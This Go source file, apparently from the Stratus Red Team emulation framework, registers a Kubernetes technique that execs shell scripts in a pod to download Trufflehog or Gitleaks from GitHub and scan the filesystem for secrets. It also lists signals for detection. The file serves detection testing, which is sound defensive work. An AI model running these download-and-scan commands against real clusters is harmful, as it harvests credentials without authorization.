package kubernetes

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"sort"
	"strings"
	"time"

	"github.com/datadog/stratus-red-team/v2/internal/utils/kubernetes"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const techniqueID = "k8s.credential-access.secret-grabber"

type SecretGrabber string

const (
	Trufflehog SecretGrabber = "trufflehog"
	Gitleaks   SecretGrabber = "gitleaks"
)

// Download URLs for secret grabber tools (latest releases for linux amd64)
// These tools detect the architecture themselves or we fetch the right one
var secretGrabberScripts = map[SecretGrabber]string{
	Trufflehog: `
		set -e
		ARCH=$(uname -m)
		case $ARCH in
			x86_64) ARCH="amd64" ;;
			aarch64) ARCH="arm64" ;;
		esac
		VERSION=$(curl -sL "https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest" | grep '"tag_name":' | sed -E 's/.*"v([^"]+)".*/\1/')
		curl -sL "https://github.com/trufflesecurity/trufflehog/releases/download/v${VERSION}/trufflehog_${VERSION}_linux_${ARCH}.tar.gz" | tar xz -C /tmp
		/tmp/trufflehog --version
		echo "Trufflehog installed successfully, scanning filesystem..."
		/tmp/trufflehog filesystem / --no-update --only-verified=false --max-depth=3 2>/dev/null || true
	`,
	Gitleaks: `
		set -e
		ARCH=$(uname -m)
		case $ARCH in
			x86_64) ARCH="x64" ;;
			aarch64) ARCH="arm64" ;;
		esac
		VERSION=$(curl -sL "https://api.github.com/repos/gitleaks/gitleaks/releases/latest" | grep '"tag_name":' | sed -E 's/.*"v([^"]+)".*/\1/')
		curl -sL "https://github.com/gitleaks/gitleaks/releases/download/v${VERSION}/gitleaks_${VERSION}_linux_${ARCH}.tar.gz" | tar xz -C /tmp
		/tmp/gitleaks version
		echo "Gitleaks installed successfully, scanning filesystem..."
		/tmp/gitleaks detect --source / --no-git --max-target-megabytes 1 2>/dev/null || true
	`,
}

func supportedSecretGrabbers() string {
	var tools []string
	for tool := range secretGrabberScripts {
		tools = append(tools, string(tool))
	}
	sort.Strings(tools)
	return strings.Join(tools, ", ")
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 techniqueID,
		FriendlyName:       "Run Secret Grabber Tool in Pod",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.CredentialAccess},
		Description: `
Downloads and runs a secret scanning tool within a pod.
This simulates an attacker using tools like Trufflehog or Gitleaks to find secrets
in the filesystem, environment variables, or mounted volumes.

Warm-up:

- Create the Stratus Red Team namespace
- Create a Pod

Detonation:

- Download the secret grabber tool from GitHub releases
- Run a filesystem scan to detect secrets
- Supported tools: ` + supportedSecretGrabbers() + `
`,
		Detection: `
Monitor for:
- Downloads from GitHub releases for security tools
- Execution of binaries named 'trufflehog', 'gitleaks' or other well-known secret scanning tools
- Process scanning large numbers of files
`,
		PrerequisitesTerraformCode: tf,
		PodConfigViaTerraform:      true,
		Detonate:                   detonate,
	})
}

// TODO: Implement TTP variation
func detonate(params map[string]string, providers stratus.CloudProviders) error {
	return detonateWithOptions(params, providers, Trufflehog)
}

func detonateWithOptions(params map[string]string, providers stratus.CloudProviders, tool SecretGrabber) error {
	config := providers.K8s().GetRestConfig()
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podName := params["pod_name"]

	script, ok := secretGrabberScripts[tool]
	if !ok {
		return fmt.Errorf("unknown secret grabber tool: %s", tool)
	}

	log.Printf("Downloading and running %s in pod %s", tool, podName)

	// Longer timeout for download and scan
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	stdout, stderr, err := kubernetes.ExecInPod(ctx, config, client, namespace, podName, "", []string{"sh", "-c", script})
	if err != nil {
		return fmt.Errorf("failed to run secret grabber: %w (stderr: %s)", err, stderr)
	}

	if stdout != "" {
		log.Printf("Output:\n%s", stdout)
	}

	log.Printf("Successfully ran %s", tool)
	return nil
}
